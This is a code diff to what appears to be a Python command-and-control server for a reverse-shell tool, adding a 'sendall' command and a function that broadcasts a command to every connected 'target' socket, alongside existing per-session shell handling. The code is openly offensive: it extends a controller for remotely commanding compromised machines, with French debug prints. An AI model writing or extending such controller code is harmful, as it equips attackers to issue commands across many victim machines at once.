@@ -43,6 +43,19 @@ def callShellForAClient(command):
     except:
         print("No sessions under that number")
 
+def reliableSendToAllTargets(data, targets_socket):
+    if type(data) is not bytes:
+        json_data = json.dumps(data)
+    else:
+        json_data = json.dumps(data.decode('utf-8'))
+
+    print("on passe la")
+
+    for i in range(len(targets_socket)):
+        print(targets_socket[i])
+        targets_socket[i].send(json_data.encode())
+
+
 def reliable_send(data, target):
     if type(data) is not bytes:
         json_data = json.dumps(data)
@@ -157,3 +170,11 @@ while True:
         stop_threads = True
         thread_manager.join()
         break
+    elif len(command) > 1 and command[:7] == "sendall":
+        try:
+            print('on passe dans le sendall')
+            reliableSendToAllTargets(command, targets_socket)
+        except:
+            print("[!!] Failed To Send Command To All Targets")
+    else:
+        print("[!!] Command doesn't exist")
